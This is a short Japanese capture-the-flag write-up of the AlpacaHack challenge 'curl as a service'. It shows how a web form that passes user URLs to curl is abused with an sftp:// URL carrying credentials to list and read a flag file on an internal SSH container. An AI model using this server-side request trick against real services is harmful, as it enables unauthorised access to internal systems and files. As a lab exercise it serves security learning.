# curl as a service

https://alpacahack.com/daily/challenges/curl-as-a-service

## 問題の概要

Docker compose で `frontend` と `secret` の 2 つのコンテナが起動しています。

### frontend

curl で任意の URL からファイルを取得できる機能を提供する Web サーバーが動いているコンテナです。

HTML フォームに URL を入力して送信すると次のような curl コマンドが実行され、結果が表示されます。

<code>curl --silent --show-error --insecure <i>URL</i></code>

(subprocess.run で実行され、`URL` は単一の引数として扱われます)

### secret

TCP/22 で SSH サーバーが動いているコンテナです。

username: `alpaca`, password: `hack` でログインできます。

`/flag-{hash}.txt` にフラグが保存されています。

## 解法

curl コマンドは sftp プロトコルにも対応しています。

URL として `sftp://alpaca:hack@secret/` を取得させるとインデックスが表示されました。

```
drwxr-xr-x    2 root     root         4096 Apr  6 00:00 opt
drwxr-xr-x    1 root     root         4096 May 14 14:30 .
lrwxrwxrwx    1 root     root            7 Mar  2 21:50 bin -> usr/bin
...
-rwxr-xr-x    1 root     root            0 May 14 14:30 .dockerenv
-rw-r--r--    1 root     root           73 May 11 16:54 flag-******.txt
```

あとは名前が判明した判明したファイル `sftp://alpaca:hack@secret/flag-******.txt` を取得すればフラグが手に入ります。
